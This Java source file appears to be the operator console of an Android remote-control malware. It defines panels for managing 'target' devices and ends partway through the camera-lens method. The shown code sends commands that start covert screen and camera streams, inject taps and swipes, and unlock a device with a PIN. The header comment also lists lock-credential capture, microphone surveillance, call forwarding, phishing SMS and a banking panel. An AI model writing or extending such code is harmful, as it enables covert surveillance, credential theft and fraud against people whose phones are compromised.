
/*
 * MODULE: Panels.java
 * PURPOSE: Core Admin UI panels (DevicesPanel, ScreenPanel, LockPanel, SmsPanel, AppsPanel, BankPanel, ToolsPanel, ResellersPanel, LiveNodesPanel).
 *
 * DIRECT INBOUND CONNECTIONS:
 * - AdminActivity.java -> Instantiates and switches panels.
 *
 * DIRECT OUTBOUND CONNECTIONS:
 * - AdminRelayClient.java -> sendCmd(String, String, JSONObject)
 * - Views.java -> TouchView, PatternView
 *
 * FUNCTION-BY-FLOW MAPPING:
 * - BasePanel: UI widget generator, theme application, and reactive message handler.
 * - DevicesPanel: Displays target list, statuses, ping, and device details.
 * - ScreenPanel: Live screen streaming (MJPEG), touch gestures, camera feed, and keypad input.
 * - LockPanel: Lock credential detection, cyber pattern visualization, interactive draw unlock, and timeline.
 * - SmsPanel: Multi-tab SMS inbox, call logs, contacts viewer, and dedicated SMS sender with SIM selection.
 * - ToolsPanel: Quick system controls, mic surveillance, black screen, call forwarding, and phishing SMS.
 */
package com.device.ctrl;
import android.animation.LayoutTransition;
import android.app.AlertDialog;
import android.content.Context;
import android.content.res.ColorStateList;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.drawable.GradientDrawable;
import android.graphics.drawable.RippleDrawable;
import android.graphics.Typeface;
import android.media.AudioFormat;
import android.media.AudioManager;
import android.media.AudioTrack;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Base64;
import android.view.*;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.widget.*;
import android.widget.BaseAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import org.json.JSONArray;
import org.json.JSONObject;
abstract class BasePanel {
    protected final Context ctx;
    protected int BG, CARD, BORDER, PRIMARY, DANGER, SUCCESS, TXT1, TXT2, ACCENT;
    public BasePanel(Context ctx, int[] theme) {
        this.ctx = ctx;
        BG = theme[0]; CARD = theme[1]; BORDER = theme[2];
        PRIMARY = theme[3]; DANGER = theme[4]; SUCCESS = theme[5];
        TXT1 = theme[6]; TXT2 = theme[7]; ACCENT = theme[8];
    }
    public abstract View buildView();
    public void onMessage(org.json.JSONObject msg) {}
    public void onDeviceSelected(com.device.ctrl.Device device) {}
    protected int dp(float dp) {
        return (int) (dp * ctx.getResources().getDisplayMetrics().density + 0.5f);
    }
    protected void styleButton(Button b) {
        b.setMinHeight(dp(38));
        b.setMinimumHeight(dp(38));
        b.setMinWidth(dp(44));
        b.setMinimumWidth(dp(44));
        b.setIncludeFontPadding(false);
        b.setGravity(Gravity.CENTER);
    }
    protected TextView txt(String s, int sz, int color, boolean bold) {
        TextView t = new TextView(ctx);
        t.setText(s); t.setTextSize(sz); t.setTextColor(color);
        t.setTypeface(Typeface.create("sans-serif" + (bold ? "-medium" : ""), Typeface.NORMAL));
        return t;
    }
    protected TextView codeTxt(String s, int sz, int color, boolean bold) {
        TextView t = new TextView(ctx);
        t.setText(s); t.setTextSize(sz); t.setTextColor(color);
        t.setTypeface(Typeface.create(Typeface.MONOSPACE, bold ? Typeface.BOLD : Typeface.NORMAL));
        return t;
    }
    protected TextView badge(String text, int textColor, int bgColor) {
        TextView b = codeTxt(text, 10, textColor, true);
        b.setPadding(dp(10), dp(4), dp(10), dp(4));
        b.setBackground(cardBg(bgColor, textColor, 10));
        b.setGravity(Gravity.CENTER);
        return b;
    }
    protected RippleDrawable ripple(int bgColor, int rippleColor, int radiusDp) {
        GradientDrawable content = new GradientDrawable();
        if (bgColor != 0) content.setColor(bgColor);
        content.setCornerRadius(dp(radiusDp));
        GradientDrawable mask = new GradientDrawable();
        mask.setColor(0xFFFFFFFF);
        mask.setCornerRadius(dp(radiusDp));
        return new RippleDrawable(ColorStateList.valueOf(rippleColor), bgColor == 0 ? null : content, mask);
    }
    protected Button btn(String label, View.OnClickListener l, int bgColor) {
        Button b = new Button(ctx);
        styleButton(b);
        b.setText(label);
        b.setTextColor(TXT1);
        b.setTextSize(12);
        b.setAllCaps(false);
        b.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        b.setBackground(ripple(bgColor == 0 ? 0 : bgColor, 0x33FFFFFF, 12));
        b.setPadding(dp(16), dp(9), dp(16), dp(9));
        if (l != null) b.setOnClickListener(l);
        return b;
    }
    protected Button gradientBtn(String label, View.OnClickListener l, int color1, int color2) {
        Button b = new Button(ctx);
        styleButton(b);
        b.setText(label);
        b.setTextColor(0xFFFFFFFF);
        b.setTextSize(12);
        b.setAllCaps(false);
        b.setTypeface(Typeface.create("sans-serif-medium", Typeface.BOLD));
        b.setLetterSpacing(0.03f);
        GradientDrawable g = new GradientDrawable(GradientDrawable.Orientation.TL_BR, new int[]{color1, color2});
        g.setCornerRadius(dp(12));
        g.setStroke(dp(1), 0x33FFFFFF);
        b.setBackground(new RippleDrawable(ColorStateList.valueOf(0x44FFFFFF), g, null));
        b.setPadding(dp(16), dp(10), dp(16), dp(10));
        if (l != null) b.setOnClickListener(l);
        return b;
    }
    protected Button pillBtn(String label, View.OnClickListener l, int fill, int border) {
        Button b = new Button(ctx);
        styleButton(b);
        b.setMinHeight(dp(32));
        b.setText(label);
        b.setTextColor(border != 0 ? border : TXT1);
        b.setTextSize(11);
        b.setAllCaps(false);
        b.setTypeface(Typeface.create("sans-serif-medium", Typeface.BOLD));
        GradientDrawable content = cardBg(fill, border, 16);
        GradientDrawable mask = new GradientDrawable();
        mask.setColor(0xFFFFFFFF);
        mask.setCornerRadius(dp(16));
        b.setBackground(new RippleDrawable(ColorStateList.valueOf(0x33FFFFFF), content, mask));
        b.setPadding(dp(14), dp(6), dp(14), dp(6));
        if (l != null) b.setOnClickListener(l);
        return b;
    }
    protected Button iconBtn(String icon, View.OnClickListener l, int fill, int border) {
        Button b = new Button(ctx);
        styleButton(b);
        b.setText(icon);
        b.setTextColor(TXT1);
        b.setTextSize(14);
        b.setPadding(dp(6), dp(6), dp(6), dp(6));
        GradientDrawable content = cardBg(fill, border, 10);
        GradientDrawable mask = new GradientDrawable();
        mask.setColor(0xFFFFFFFF);
        mask.setCornerRadius(dp(10));
        b.setBackground(new RippleDrawable(ColorStateList.valueOf(0x33FFFFFF), content, mask));
        if (l != null) b.setOnClickListener(l);
        return b;
    }
    protected EditText searchField(String hint, TextWatcher watcher) {
        EditText edit = new EditText(ctx);
        edit.setHint(hint);
        edit.setHintTextColor(TXT2);
        edit.setTextColor(TXT1);
        edit.setTextSize(12);
        edit.setSingleLine(true);
        edit.setBackground(cardBg(CARD, BORDER, 14));
        edit.setPadding(dp(16), dp(11), dp(16), dp(11));
        edit.setTypeface(Typeface.create(Typeface.MONOSPACE, Typeface.NORMAL));
        if (watcher != null) edit.addTextChangedListener(watcher);
        return edit;
    }
    protected LinearLayout statTile(String label, String value, int valColor, String sub) {
        LinearLayout tile = row(true);
        tile.setBackground(glassCardBg(CARD, BORDER));
        tile.setPadding(dp(14), dp(12), dp(14), dp(12));
        tile.setGravity(Gravity.CENTER_HORIZONTAL);
        tile.addView(codeTxt(label.toUpperCase(), 10, TXT2, true));
        TextView tvVal = codeTxt(value, 18, valColor, true);
        tvVal.setPadding(0, dp(4), 0, dp(2));
        tile.addView(tvVal);
        if (sub != null && !sub.isEmpty()) tile.addView(txt(sub, 9, TXT2, false));
        return tile;
    }
    protected GradientDrawable glassCardBg(int fill, int borderCol) {
        GradientDrawable g = new GradientDrawable();
        g.setColor(fill);
        g.setCornerRadius(dp(16));
        if (borderCol != 0) g.setStroke(dp(1.5f), borderCol);
        return g;
    }
    protected GradientDrawable cardBg(int fill, int stroke, int rDp) {
        GradientDrawable g = new GradientDrawable();
        g.setColor(fill);
        g.setCornerRadius(dp(rDp));
        if (stroke != 0) g.setStroke(dp(1.5f), stroke);
        return g;
    }
    protected GradientDrawable circleBg(int color) {
        GradientDrawable g = new GradientDrawable();
        g.setColor(color);
        g.setShape(GradientDrawable.OVAL);
        return g;
    }
    protected void fadeInUp(View v) {
        v.setAlpha(0f);
        v.setTranslationY(dp(14));
        v.animate().alpha(1f).translationY(0f).setDuration(220).start();
    }
    protected LinearLayout row(boolean vertical) {
        LinearLayout l = new LinearLayout(ctx);
        l.setOrientation(vertical ? LinearLayout.VERTICAL : LinearLayout.HORIZONTAL);
        l.setLayoutTransition(new LayoutTransition());
        return l;
    }
    protected LinearLayout.LayoutParams fill(int weight) {
        return new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, weight);
    }
    protected LinearLayout.LayoutParams matchWrap() {
        return new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
    }
    protected LinearLayout sectionHeader(String title, View actionView) {
        LinearLayout h = row(false);
        h.setGravity(Gravity.CENTER_VERTICAL);
        h.setPadding(dp(4), dp(14), dp(4), dp(6));
        TextView tvT = codeTxt("▶ " + title.toUpperCase(), 11, PRIMARY, true);
        tvT.setLetterSpacing(0.06f);
        h.addView(tvT, new LinearLayout.LayoutParams(0, -2, 1f));
        if (actionView != null) h.addView(actionView);
        return h;
    }
}
class DevicesPanel extends BasePanel {
    private ListView deviceList;
    private DeviceAdapter adapter;
    private final Map<String, Device> devices;
    private final OnDeviceSelectedListener selectionListener;
    private String filterQuery = "";
    private final Handler h = new Handler(Looper.getMainLooper());
    private final Runnable autoRefresh = new Runnable() { @Override public void run() { refresh(); h.postDelayed(this, 60000); } };
    public interface OnDeviceSelectedListener { void onSelected(Device d); }
    public DevicesPanel(Context ctx, int[] theme, Map<String, Device> devices, OnDeviceSelectedListener l) { 
        super(ctx, theme); this.devices = devices; this.selectionListener = l; 
        h.postDelayed(autoRefresh, 60000); 
    }
    @Override
    public View buildView() {
        LinearLayout root = row(true); root.setPadding(16, 16, 16, 16);
        EditText searchEdit = searchField("Search ID / Name...", new TextWatcher() {
            public void afterTextChanged(Editable s) { filterQuery = s.toString().toLowerCase().trim(); refresh(); }
            public void beforeTextChanged(CharSequence s, int st, int c, int a) {} public void onTextChanged(CharSequence s, int st, int b, int c) {}
        });
        root.addView(searchEdit);
        deviceList = new ListView(ctx); deviceList.setDivider(null); deviceList.setDividerHeight(0);
        adapter = new DeviceAdapter(); deviceList.setAdapter(adapter);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(-1, -1, 1f); lp.topMargin = dp(16);
        root.addView(deviceList, lp); return root;
    }
    public void refresh() {
        List<Device> matches = new ArrayList<>();
        for (Device d : devices.values()) {
            if (!filterQuery.isEmpty() && !d.getSafeName().toLowerCase().contains(filterQuery) && !d.androidId.toLowerCase().contains(filterQuery)) continue;
            matches.add(d);
        }
        if (adapter != null) adapter.setData(matches);
    }
    @Override public void onMessage(JSONObject msg) { refresh(); }
    private void showRenameDialog(Device d) {
        EditText input = new EditText(ctx); input.setSingleLine(true); input.setText(d.nickname != null ? d.nickname : "");
        new android.app.AlertDialog.Builder(ctx).setTitle("Nickname").setView(input).setPositiveButton("Save", (dialog, w) -> {
            d.nickname = input.getText().toString().trim(); ctx.getSharedPreferences("device_nicknames", Context.MODE_PRIVATE).edit().putString("nick_" + d.androidId, d.nickname).apply(); refresh();
        }).show();
    }
    private class DeviceAdapter extends BaseAdapter {
        private List<Device> data = new ArrayList<>();
        public void setData(List<Device> items) { this.data = items; notifyDataSetChanged(); }
        @Override public int getCount() { return data.size(); } @Override public Device getItem(int p) { return data.get(p); } @Override public long getItemId(int p) { return p; }
        @Override public View getView(int p, View cv, ViewGroup parent) {
            DevVH vh;
            if (cv == null) {
                LinearLayout card = row(false); card.setBackground(cardBg(CARD, BORDER, 14)); card.setPadding(dp(12), dp(10), dp(12), dp(10)); card.setGravity(Gravity.CENTER_VERTICAL);
                TextView stL = codeTxt("● ONLINE", 10, SUCCESS, true); card.addView(stL, new LinearLayout.LayoutParams(dp(65), -2));
                LinearLayout cCol = row(false); cCol.setGravity(Gravity.CENTER);
                Button bE = new Button(ctx); styleButton(bE); bE.setText("✏️"); bE.setTextSize(12); bE.setBackground(null); cCol.addView(bE, dp(24), dp(24));
                TextView nT = codeTxt("", 13, TXT1, true); nT.setPadding(dp(6),0,dp(6),0); cCol.addView(nT);
                Button bC = new Button(ctx); styleButton(bC); bC.setText("📋"); bC.setTextSize(12); bC.setBackground(null); cCol.addView(bC, dp(24), dp(24));
                Button bD = new Button(ctx); styleButton(bD); bD.setText("🗑️"); bD.setTextSize(12); bD.setBackground(null); cCol.addView(bD, dp(24), dp(24));
                card.addView(cCol, new LinearLayout.LayoutParams(0, -2, 1f));
                LinearLayout rCol = row(true); rCol.setGravity(Gravity.END | Gravity.CENTER_VERTICAL);
                TextView stR = codeTxt("OFFLINE ●", 10, DANGER, true); rCol.addView(stR);
                TextView tmT = codeTxt("", 9, TXT2, false); tmT.setGravity(Gravity.END); rCol.addView(tmT);
                card.addView(rCol, new LinearLayout.LayoutParams(dp(65), -2));
                LinearLayout wrap = new LinearLayout(ctx); wrap.setPadding(0, 0, 0, dp(10)); wrap.addView(card, matchWrap()); cv = wrap;
                vh = new DevVH(); vh.c = card; vh.stL = stL; vh.n = nT; vh.bE = bE; vh.bC = bC; vh.bD = bD; vh.stR = stR; vh.tm = tmT; cv.setTag(vh);
            } else vh = (DevVH) cv.getTag();
            Device d = getItem(p);
            vh.c.setOnClickListener(v -> { if(selectionListener != null) selectionListener.onSelected(d); });
            vh.stL.setVisibility(d.online ? View.VISIBLE : View.INVISIBLE);
            vh.n.setText(d.getSafeName());
            vh.bE.setOnClickListener(v -> showRenameDialog(d));
            vh.bC.setOnClickListener(v -> { ((android.content.ClipboardManager)ctx.getSystemService(Context.CLIPBOARD_SERVICE)).setPrimaryClip(android.content.ClipData.newPlainText("ID", d.androidId)); Toast.makeText(ctx, "Copied ID", 0).show(); });
            vh.bD.setOnClickListener(v -> { devices.remove(d.androidId); try { AdminRelayClient.get().send(new JSONObject().put("type", "delete_device").put("androidId", d.androidId)); } catch(Exception ignored){} refresh(); });
            vh.stR.setVisibility(!d.online ? View.VISIBLE : View.INVISIBLE);
            long diff = (System.currentTimeMillis() - d.lastSeen) / 60000; 
            vh.tm.setText(!d.online ? (diff <= 0 ? "0m" : diff + "m") : "");
            return cv;
        }
    }
    private class DevVH { LinearLayout c; TextView stL, n, stR, tm; Button bE, bC, bD; }
}
class ScreenPanel extends BasePanel {
    private final Handler h = new Handler(Looper.getMainLooper());
    private ImageView screenView;
    private TouchView touchOverlay;
    private TextView numpadDisplay, tvQuality;
    private Button btnMjpeg, btnNodes, btnCamMode, btnCamLens;
    private boolean isStreamOn = false, isNodesOn = false;
    private boolean isCamView = false, isCamStreamOn = false;
    private String camLens = "back";
    private Runnable camPoller;
    private int deviceW = 1080, deviceH = 2400, streamQuality = 45;
    private Runnable nodePoller;
    private final StringBuilder numBuf = new StringBuilder();
    private Device selDev;
    private Bitmap reusableBmp;
    private final BitmapFactory.Options bmpOpts = new BitmapFactory.Options();
    private TextView tvTargetBanner, tvFps, tvPlaceholder;
    private View lensRow, qCard, nav, numView;
    private FrameLayout frame;
    public ScreenPanel(Context ctx, int[] theme) { super(ctx, theme); bmpOpts.inMutable = true; bmpOpts.inPreferredConfig = Bitmap.Config.RGB_565; }
    @Override
    public View buildView() {
        LinearLayout root = row(true);
        root.setPadding(10, 10, 10, 10);
        root.setBackgroundColor(BG);
        LinearLayout actions = row(false);
        actions.setGravity(Gravity.CENTER_VERTICAL);
        actions.setPadding(8, 8, 8, 8);
        actions.setBackground(glassCardBg(CARD, BORDER));
        btnMjpeg = gradientBtn("▶ START", v -> toggleStream(), PRIMARY, ACCENT);
        btnNodes = gradientBtn("◈ X-RAY", v -> toggleNodes(), PRIMARY, ACCENT);
        btnCamMode = gradientBtn("📷 CAM", v -> toggleCamView(), PRIMARY, ACCENT);
        Button btnFull = gradientBtn("⛶ FULL", null, PRIMARY, ACCENT);
        btnMjpeg.setTextSize(11);
        btnNodes.setTextSize(11);
        btnCamMode.setTextSize(11);
        btnFull.setTextSize(11);
        btnMjpeg.setSingleLine(true);
        btnNodes.setSingleLine(true);
        btnCamMode.setSingleLine(true);
        btnFull.setSingleLine(true);
        LinearLayout.LayoutParams actionLp = fill(1);
        actionLp.setMargins(3, 0, 3, 0);
        actions.addView(btnMjpeg, actionLp);
        actions.addView(btnNodes, actionLp);
        actions.addView(btnCamMode, actionLp);
        btnCamLens = gradientBtn("⬅ BACK", v -> toggleCamLens(), PRIMARY, ACCENT);
        btnCamLens.setTextSize(10);
        btnCamLens.setSingleLine(true);
        btnCamLens.setVisibility(View.GONE);
        actions.addView(btnCamLens, new LinearLayout.LayoutParams(dp(65), -1));
        actions.addView(btnFull, new LinearLayout.LayoutParams(dp(65), -1));
        root.addView(actions);
        LinearLayout qCard = row(false);
        qCard.setGravity(Gravity.CENTER_VERTICAL);
        qCard.setPadding(12, 4, 12, 4);
        qCard.setBackground(glassCardBg(CARD, BORDER));
        tvQuality = txt("QUALITY 45", 10, TXT2, true);
        qCard.addView(tvQuality, new LinearLayout.LayoutParams(92, -2));
        SeekBar qBar = new SeekBar(ctx);
        qBar.setMax(80);
        qBar.setProgress(35);
        qBar.setOnSeekBarChangeListener(new SeekBar.OnSeekBarChangeListener() {
            public void onProgressChanged(SeekBar s, int p, boolean user) {
                streamQuality = 10 + p;
                tvQuality.setText("QUALITY " + streamQuality);
            }
            public void onStartTrackingTouch(SeekBar s) {}
            public void onStopTrackingTouch(SeekBar s) {
                if (selDev != null) try {
                    AdminRelayClient.get().sendCmd(selDev.androidId, "set_stream_quality",
                        new JSONObject().put("quality", streamQuality));
                    AdminRelayClient.get().sendCmd(selDev.androidId, "set_cam_quality",
                        new JSONObject().put("quality", Math.min(60, streamQuality)));
                } catch (Exception ignored) {}
            }
        });
        qCard.addView(qBar, new LinearLayout.LayoutParams(0, -2, 1f));
        root.addView(qCard);
        FrameLayout frame = new FrameLayout(ctx) {
            @Override protected void onMeasure(int wSpec, int hSpec) {
                int w = MeasureSpec.getSize(wSpec);
                int hh = (int)(MeasureSpec.getSize(hSpec) * 0.84);
                if (deviceW > 0 && deviceH > 0) {
                    float asp = (float) deviceH / deviceW;
                    if (hh > w * asp) hh = (int)(w * asp);
                    else w = (int)(hh / asp);
                }
                super.onMeasure(
                    MeasureSpec.makeMeasureSpec(w, MeasureSpec.EXACTLY),
                    MeasureSpec.makeMeasureSpec(hh, MeasureSpec.EXACTLY)
                );
            }
        };
        frame.setPadding(2, 2, 2, 2);
        frame.setBackground(glassCardBg(0xFF05070B, BORDER));
        screenView = new ImageView(ctx);
        screenView.setScaleType(ImageView.ScaleType.FIT_CENTER);
        frame.addView(screenView, new FrameLayout.LayoutParams(-1, -1));
        touchOverlay = new TouchView(ctx);
        touchOverlay.setOnTouchGestureListener(new TouchView.OnTouchGesture() {
            public void onTap(int x, int y) { sendGesture("tap", x, y, 0, 0); }
            public void onSwipe(int x1,int y1,int x2,int y2) { sendSwipe(x1,y1,x2,y2); }
            public void onLongPress(int x, int y) { sendGesture("long_press", x, y, 0, 0); }
            public void onScroll(String dir) {
                try {
                    AdminRelayClient.get().sendCmd(selDev.androidId, "scroll",
                        new JSONObject().put("direction", dir));
                } catch (Exception ignored) {}
            }
            public void onNodeTap(String t, int cx, int cy) {
                sendDirectTap(cx, cy);
            }
        });
        frame.addView(touchOverlay, new FrameLayout.LayoutParams(-1, -1));
        LinearLayout.LayoutParams frameLp = new LinearLayout.LayoutParams(-1, 0, 1f);
        frameLp.gravity = Gravity.CENTER_HORIZONTAL;
        frameLp.setMargins(0, 8, 0, 8);
        root.addView(frame, frameLp);
        LinearLayout nav = row(false);
        nav.setGravity(Gravity.CENTER);
        nav.setPadding(8, 6, 8, 6);
        nav.setBackground(glassCardBg(CARD, BORDER));
        String[][] btns = {{"▢", "recents"}, {"⌂", "home"}, {"◁", "back"}};
        for (String[] nb : btns) {
            Button b = gradientBtn(nb[0],
                v -> {
                    if (selDev != null)
                        AdminRelayClient.get().sendCmd(selDev.androidId, nb[1], null);
                }, PRIMARY, ACCENT);
            b.setTextSize(17);
            LinearLayout.LayoutParams lp = fill(1);
            lp.setMargins(4, 0, 4, 0);
            nav.addView(b, lp);
        }
        root.addView(nav);
        View numView = buildNumpad();
        root.addView(numView);
        btnFull.setOnClickListener(v -> {
            boolean compact = qCard.getVisibility() == View.VISIBLE;
            qCard.setVisibility(compact ? View.GONE : View.VISIBLE);
            nav.setVisibility(compact ? View.GONE : View.VISIBLE);
            numView.setVisibility(compact ? View.GONE : View.VISIBLE);
            ((Button) v).setText(compact ? "⛶Full screen" : "Close");
        });
        return root;
    }
    private View buildNumpad() {
        LinearLayout card = row(true); 
        card.setBackground(glassCardBg(CARD, BORDER)); 
        card.setPadding(12, 10, 12, 10); 
        card.setGravity(Gravity.CENTER_HORIZONTAL);
        numpadDisplay = codeTxt("TARGET INPUT", 12, PRIMARY, true); 
        numpadDisplay.setGravity(Gravity.CENTER); 
        numpadDisplay.setPadding(0, 0, 0, 10); 
        card.addView(numpadDisplay);
        String[] keys = {"1","2","3","4","5","6","7","8","9","⌫","0","✔"};
        for (int r = 0; r < 4; r++) {
            LinearLayout row = row(false); 
            row.setGravity(Gravity.CENTER);
            for (int c = 0; c < 3; c++) {
                String k = keys[r * 3 + c]; 
                int bgCol = "⌫".equals(k) ? 0xFF3A1217 : "✔".equals(k) ? 0xFF0D3327 : CARD;
                Button b = gradientBtn(k, v -> onNumKey(k), PRIMARY, ACCENT); 
                b.setTextSize("✔".equals(k) ? 14 : 16);
                LinearLayout.LayoutParams lp = fill(1); 
                lp.setMargins(3, 3, 3, 3); 
                row.addView(b, lp);
            }
            card.addView(row);
        }
        return card;
    }
    private void onNumKey(String k) {
        if ("⌫".equals(k)) { if (numBuf.length() > 0) numBuf.deleteCharAt(numBuf.length() - 1); }
        else if ("✔".equals(k)) { if (numBuf.length() > 0 && selDev != null) try { AdminRelayClient.get().sendCmd(selDev.androidId, "unlock_with_pin", new JSONObject().put("pin", numBuf.toString())); } catch(Exception ignored){} numBuf.setLength(0); }
        else if (numBuf.length() < 12) numBuf.append(k);
        if (numpadDisplay != null) numpadDisplay.setText(numBuf.length() > 0 ? numBuf.toString() : "TARGET INPUT");
        if (!"✔".equals(k) && selDev != null) try { AdminRelayClient.get().sendCmd(selDev.androidId, "type_text", new JSONObject().put("text", numBuf.toString())); if(!"⌫".equals(k)) AdminRelayClient.get().sendCmd(selDev.androidId, "click_text", new JSONObject().put("text", k)); } catch(Exception ignored){}
    }
    public void toggleStream() {
        isStreamOn = !isStreamOn; 
        btnMjpeg.setText(isStreamOn ? "⏹ STOP" : "▶ START");
        if (isStreamOn) {
            GradientDrawable g = new GradientDrawable();
            g.setColor(DANGER);
            g.setCornerRadius(dp(14));
            btnMjpeg.setBackground(new RippleDrawable(ColorStateList.valueOf(0x44FFFFFF), g, null));
            btnMjpeg.setTextColor(0xFFFFFFFF);
        } else {
            GradientDrawable g = new GradientDrawable(GradientDrawable.Orientation.TL_BR, new int[]{PRIMARY, ACCENT});
            g.setCornerRadius(dp(14));
            btnMjpeg.setBackground(new RippleDrawable(ColorStateList.valueOf(0x44FFFFFF), g, null));
            btnMjpeg.setTextColor(0xFFFFFFFF);
        }
        if (selDev != null) AdminRelayClient.get().sendCmd(selDev.androidId, isStreamOn ? "start_mjpeg" : "stop_mjpeg", null);
        if (!isStreamOn) h.post(() -> screenView.setImageBitmap(null));
    }
    public void stopStream() { if (isStreamOn) toggleStream(); stopCamFeed(); }
    public void toggleNodes() {
        isNodesOn = !isNodesOn; 
        btnNodes.setText(isNodesOn ? "◈ ACTIVE" : "◈ X-RAY");
        if (isNodesOn) {
            GradientDrawable g = new GradientDrawable();
            g.setColor(0xFF0F131C);
            g.setCornerRadius(dp(14));
            btnNodes.setBackground(new RippleDrawable(ColorStateList.valueOf(0x44FFFFFF), g, null));
            btnNodes.setTextColor(ACCENT);
            if (nodePoller == null) nodePoller = () -> { 
                if (isNodesOn && selDev != null && selDev.online) { 
                    AdminRelayClient.get().sendCmd(selDev.androidId, "get_ui_nodes", null); 
                    h.postDelayed(nodePoller, 2500); 
                } 
            }; 
            h.post(nodePoller); 
        } else { 
            GradientDrawable g = new GradientDrawable(GradientDrawable.Orientation.TL_BR, new int[]{PRIMARY, ACCENT});
            g.setCornerRadius(dp(14));
            btnNodes.setBackground(new RippleDrawable(ColorStateList.valueOf(0x44FFFFFF), g, null));
            btnNodes.setTextColor(0xFFFFFFFF);
            if (nodePoller != null) h.removeCallbacks(nodePoller); 
            touchOverlay.clearNodes(); 
        }
    }
    private void sendDirectTap(int rx, int ry) {
        if (selDev != null) try {
            AdminRelayClient.get().sendCmd(selDev.androidId, "tap",
                new JSONObject().put("x", rx).put("y", ry));
        } catch (Exception ignored) {}
    }
    private void sendGesture(String a, int x, int y, int x2, int y2) { 
        if (selDev != null) try { AdminRelayClient.get().sendCmd(selDev.androidId, a, new JSONObject().put("x", mapX(x)).put("y", mapY(y))); } catch(Exception ignored){} 
    }
    private void sendSwipe(int x1, int y1, int x2, int y2) { 
        if (selDev != null) try { AdminRelayClient.get().sendCmd(selDev.androidId, "swipe", new JSONObject().put("x1", mapX(x1)).put("y1", mapY(y1)).put("x2", mapX(x2)).put("y2", mapY(y2)).put("duration", 150)); } catch(Exception ignored){} 
    }
    private int mapX(int tx) { 
        if (touchOverlay.getWidth() <= 0 || deviceW <= 0) return tx; 
        float sc = Math.min((float) touchOverlay.getWidth() / deviceW, (float) touchOverlay.getHeight() / deviceH); 
        return (int) Math.max(0, Math.min(deviceW, (tx - (touchOverlay.getWidth() - deviceW * sc) / 2f) / sc)); 
    }
    private int mapY(int ty) { 
        if (touchOverlay.getHeight() <= 0 || deviceH <= 0) return ty; 
        float sc = Math.min((float) touchOverlay.getWidth() / deviceW, (float) touchOverlay.getHeight() / deviceH); 
        return (int) Math.max(0, Math.min(deviceH, (ty - (touchOverlay.getHeight() - deviceH * sc) / 2f) / sc)); 
    }
    @Override public void onMessage(JSONObject msg) {
        String type = msg.optString("type", "");
        if (("camera_photo".equals(type) || "camera_frame".equals(type)) && isCamView) {
            try {
                String raw = msg.optString("photo", "");
                if (raw.isEmpty()) raw = msg.optString("image", "");
                if (raw.isEmpty()) return;
                byte[] b = Base64.decode(raw, Base64.DEFAULT);
                if (reusableBmp != null) bmpOpts.inBitmap = reusableBmp;
                try { reusableBmp = BitmapFactory.decodeByteArray(b, 0, b.length, bmpOpts); }
                catch (IllegalArgumentException e) {
                    bmpOpts.inBitmap = null;
                    reusableBmp = BitmapFactory.decodeByteArray(b, 0, b.length, bmpOpts);
                }
                if (reusableBmp != null) {
                    screenView.setImageBitmap(reusableBmp);
                    screenView.invalidate();
                    try {
                        int cx = reusableBmp.getWidth() / 2, cy = reusableBmp.getHeight() / 2;
                        touchOverlay.setSampleColor(reusableBmp.getPixel(cx, cy));
                    } catch (Exception ignored) {}
                }
            } catch (Exception e) {
                android.util.Log.e("ScreenPanel", "Cam decode error: " + e.getMessage());
            }
        } else if ("screen_frame".equals(type) && isStreamOn && !isCamView) {
            try {
                String raw = msg.optString("frame", "");
                if (raw.isEmpty()) raw = msg.optString("image", "");
                if (raw.isEmpty()) return;
                byte[] b = Base64.decode(raw, Base64.DEFAULT);
                if (reusableBmp != null) bmpOpts.inBitmap = reusableBmp;
                try {
                    reusableBmp = BitmapFactory.decodeByteArray(b, 0, b.length, bmpOpts);
                } catch(IllegalArgumentException e) {
                    bmpOpts.inBitmap = null;
                    reusableBmp = BitmapFactory.decodeByteArray(b, 0, b.length, bmpOpts);
                }
                if (reusableBmp != null) {
                    screenView.setImageBitmap(reusableBmp);
                    screenView.invalidate();
                    try {
                        int cx = reusableBmp.getWidth() / 2, cy = reusableBmp.getHeight() / 2;
                        touchOverlay.setSampleColor(reusableBmp.getPixel(cx, cy));
                    } catch (Exception ignored) {}
                }
            } catch (Exception e) {
                android.util.Log.e("ScreenPanel", "Screen decode error: " + e.getMessage());
            }
        } else if ("ui_nodes".equals(type)) {
            int sw = msg.optInt("screenW", 0), sh = msg.optInt("screenH", 0); 
            if (sw > 0 && sh > 0) { deviceW = sw; deviceH = sh; touchOverlay.setScreenSize(sw, sh); }
            if (isNodesOn) touchOverlay.setNodes(msg.optString("nodes", ""), sw, sh);
        }
    }
    @Override public void onDeviceSelected(Device d) { 
        this.selDev = d; 
        if (nodePoller != null) h.removeCallbacks(nodePoller); 
        if (camPoller != null) h.removeCallbacks(camPoller);
        if (isStreamOn && !isCamView) AdminRelayClient.get().sendCmd(d.androidId, "start_mjpeg", null); 
        if (isCamView) { try {
            AdminRelayClient.get().sendCmd(d.androidId, "start_cam_stream",
                new JSONObject().put("lens", camLens).put("quality", streamQuality));
        } catch (Exception ignored) {} if (camPoller != null) h.post(camPoller); }
        if (isNodesOn) h.post(nodePoller); 
    }
    private void toggleCamView() {
        isCamView = !isCamView;
        btnCamMode.setText(isCamView ? "🖥 SCREEN" : "📷 CAM");
        btnCamLens.setVisibility(isCamView ? View.VISIBLE : View.GONE);
        touchOverlay.setVisibility(isCamView ? View.GONE : View.VISIBLE);
        if (isCamView) {
            if (isStreamOn && selDev != null)
                AdminRelayClient.get().sendCmd(selDev.androidId, "stop_mjpeg", null);
            if (selDev != null) try {
                AdminRelayClient.get().sendCmd(selDev.androidId, "start_cam_stream",
                    new JSONObject().put("lens", camLens).put("quality", streamQuality));
            } catch (Exception ignored) {}
            isCamStreamOn = true;
        } else stopCamFeed();
    }
    private void toggleCamLens() {
